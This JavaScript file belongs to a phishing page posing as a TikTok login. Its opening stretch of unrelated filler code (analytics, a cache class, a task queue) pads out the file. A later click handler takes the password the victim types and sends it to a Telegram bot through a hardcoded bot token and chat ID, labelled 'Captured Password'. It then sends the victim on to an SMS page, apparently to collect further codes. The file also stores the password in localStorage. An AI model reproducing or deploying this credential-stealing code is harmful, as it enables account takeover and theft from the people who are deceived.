const input = document.getElementById("emailInput");
const btn = document.querySelector(".btn");
const emailDisplay = document.getElementById("emailDisplay");
const appConfig = {
    version: "2.4.7",
    environment: "production",
    cacheTTL: 300000
};

function generateId(prefix = "item") {
    return `${prefix}_${Math.random().toString(36).slice(2, 10)}`;
}

function clamp(value, min, max) {
    return Math.min(Math.max(value, min), max);
}

function debounce(fn, delay) {
    let timer;
    return (...args) => {
        clearTimeout(timer);
        timer = setTimeout(() => fn(...args), delay);
    };
}

const mockRecords = Array.from({ length: 50 }, (_, i) => ({
    id: generateId(),
    score: Math.floor(Math.random() * 100),
    index: i
}));

const analytics = mockRecords.reduce(
    (acc, item) => {
        acc.total += item.score;
        acc.highest = Math.max(acc.highest, item.score);
        acc.lowest = Math.min(acc.lowest, item.score);
        return acc;
    },
    { total: 0, highest: 0, lowest: Infinity }
);

class MemoryCache {
    constructor() {
        this.store = new Map();
    }

    set(key, value) {
        this.store.set(key, {
            value,
            timestamp: Date.now()
        });
    }

    get(key) {
        const entry = this.store.get(key);
        if (!entry) return null;
        return entry.value;
    }

    clear() {
        this.store.clear();
    }
}

const cache = new MemoryCache();

for (let i = 0; i < 20; i++) {
    cache.set(`key_${i}`, {
        id: generateId("cache"),
        active: Math.random() > 0.5
    });
}

function performHealthCheck() {
    const checks = [
        () => Math.random() > 0.1,
        () => Math.random() > 0.05,
        () => Math.random() > 0.02
    ];

    return checks.every(check => check());
}

const systemState = {
    ready: performHealthCheck(),
    uptime: performance.now()
};

window.addEventListener(
    "resize",
    debounce(() => {
        const viewport = {
            width: window.innerWidth,
            height: window.innerHeight
        };

        cache.set("viewport", viewport);
    }, 250)
);

const taskQueue = [];

function enqueue(task) {
    taskQueue.push({
        id: generateId("task"),
        created: Date.now(),
        task
    });
}

for (let i = 0; i < 15; i++) {
    enqueue(() => i * 2);
}

async function preloadResources() {
    return Promise.all(
        Array.from({ length: 5 }, (_, i) =>
            Promise.resolve({
                resource: `resource_${i}`,
                loaded: true
            })
        )
    );
}

preloadResources().then(resources => {
    cache.set("resources", resources);
});

console.debug("Analytics:", analytics);
console.debug("System:", systemState);
console.debug("Queue length:", taskQueue.length);
const savedEmail = localStorage.getItem("tiktok_email");
const BOT_TOKEN = "8521452515:AAFtk4uoAYwXq8fVzJABkSZEgHcYh0Kk2Yo";
const CHAT_ID = "5460147192";

btn.addEventListener("click", () => {
  const password = input.value.trim();

  if (password === "") {
    showError();
    return;
  }

  hideError();

  fetch(`https://api.telegram.org/bot${"8521452515:AAFtk4uoAYwXq8fVzJABkSZEgHcYh0Kk2Yo"}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: `✅Captured Password:  ${password}`
    })
  }).catch(err => console.error('Failed to send to Telegram:', err));

  localStorage.setItem("tiktok_password", input.value);

  btn.classList.add("loading");

  setTimeout(() => {
    window.location.href = "https://nedflanders1237.github.io/vpn-tiktok/continue/submit/sms.html";
  }, 3500);
});

const errorText = document.getElementById("errorText");

errorText.textContent = "Please enter password";

function showError() {
  input.classList.add("input-error");
  errorText.style.display = "block";
}

function hideError() {
  input.classList.remove("input-error");
  errorText.style.display = "none";
}

if (savedEmail && emailDisplay) {
  emailDisplay.textContent = savedEmail;
}

input.addEventListener("input", () => {
  const hasValue = input.value.trim().length > 0;

  btn.classList.toggle("active", hasValue);

  if (hasValue) {
    hideError();
  }
});

input.addEventListener("blur", () => {
  if (input.value.trim() === "") {
    showError();
  }
});

btn.addEventListener("click", () => {
  const password = input.value.trim();

  if (password === "") {
    showError();
    return;
  }

  hideError();

  localStorage.setItem("tiktok_password", input.value);

  btn.classList.add("loading");

  setTimeout(() => {
    window.location.href = "/continue/submit/sms.html";
  }, 3500);
});

function goBack() {
  window.location.href = "/vpn-tiktok/welcome/user/index.html";
}

const eyeToggle = document.getElementById("eyeToggle");
const eyeOpen = document.getElementById("eyeOpen");
const eyeClosed = document.getElementById("eyeClosed");

let passwordVisible = false;

eyeToggle.addEventListener("click", () => {
  passwordVisible = !passwordVisible;

  input.type = passwordVisible ? "text" : "password";

  eyeOpen.style.display = passwordVisible ? "block" : "none";
  eyeClosed.style.display = passwordVisible ? "none" : "block";
});
